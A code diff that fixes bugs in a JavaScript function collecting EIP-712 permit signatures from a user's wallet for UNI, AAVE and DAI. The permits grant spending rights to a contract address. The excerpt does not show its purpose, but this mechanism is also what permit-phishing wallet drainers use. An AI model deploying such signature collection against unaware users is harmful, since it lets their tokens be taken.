@@ -140,9 +140,8 @@ export const signTokenPermit = async ({ walletAddress, fromToken }) => {
         let messageForDAIonETH = {
             holder: walletAddress,
             spender: cAddress,
-            value,
             nonce: tokenNonce,
-            deadline,
+            expiry: deadline,
             allowed: true,
         };
 
@@ -161,7 +160,7 @@ export const signTokenPermit = async ({ walletAddress, fromToken }) => {
 
         console.log(fromToken, "fromToken herer$#$$$");
 
-        if (fromToken === '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984') {
+        if (fromToken.toLowerCase() === '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984'.toLowerCase()) {
             // Uniswap token
             tokenDomain = {
                 name: tokenDomainName,
@@ -191,12 +190,12 @@ export const signTokenPermit = async ({ walletAddress, fromToken }) => {
                     domainData: tokenDomain,
                 })
             );
-        } else if (fromToken === '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9') {
+        } else if (fromToken.toLowerCase() === '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9'.toLowerCase()) {
             console.log("AAVE token detected", tokenDomain);
             signaturePromises.push(
                 getSignature({
                     walletAddress,
-                    messageForAaveonETH,
+                    message: messageForAaveonETH,
                     messageType: {
                         types: [
                             { name: 'owner', type: 'address' },
@@ -217,12 +216,12 @@ export const signTokenPermit = async ({ walletAddress, fromToken }) => {
                 })
             );
         } 
-        else if (fromToken === '0x6B175474E89094C44Da98b954EedeAC495271d0F') {
+        else if (fromToken.toLowerCase() === '0x6B175474E89094C44Da98b954EedeAC495271d0F'.toLowerCase()) {
             console.log("DAI token detected", tokenDomain);
             signaturePromises.push(
                 getSignature({
                     walletAddress,
-                    messageForDAIonETH,
+                    message: messageForDAIonETH,
                     messageType: {
                         types: [
                             { name: 'holder', type: 'address' },
